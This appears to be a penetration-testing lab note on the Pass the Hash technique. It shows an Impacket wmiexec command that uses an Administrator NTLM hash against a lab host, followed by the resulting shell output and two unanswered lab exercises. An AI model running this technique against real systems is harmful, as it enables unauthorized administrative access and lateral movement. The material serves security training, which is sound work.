# Pass the Hash

Passing the hash using Impacket wmiexec
>``` shell
>kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
>
># ========== Expected Result ==========
>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
>
>[*] SMBv3.0 dialect used
>[!] Launching semi-interactive shell - Careful what you execute
>[!] Press help for extra shell commands
>C:\>
># =====================================
>
>C:\>hostname
>
># ========== Expected Result ==========
>FILES04
># =====================================
>
>C:\>whoami
>
># ========== Expected Result ==========
>files04\administrator
># =====================================
>```

Lab 1 - Start VM Group 1 and repeat the steps discussed in this section. Which TCP port needs to be enabled on the target machine in order for the pass the hash technique to work?
>``` shell
>
>```
>

Lab 2 - Start VM Group 2 and try to execute the pass the hash technique to move laterally to web04 to get the flag located on the administrator's desktop.
>``` shell
>
>```
>
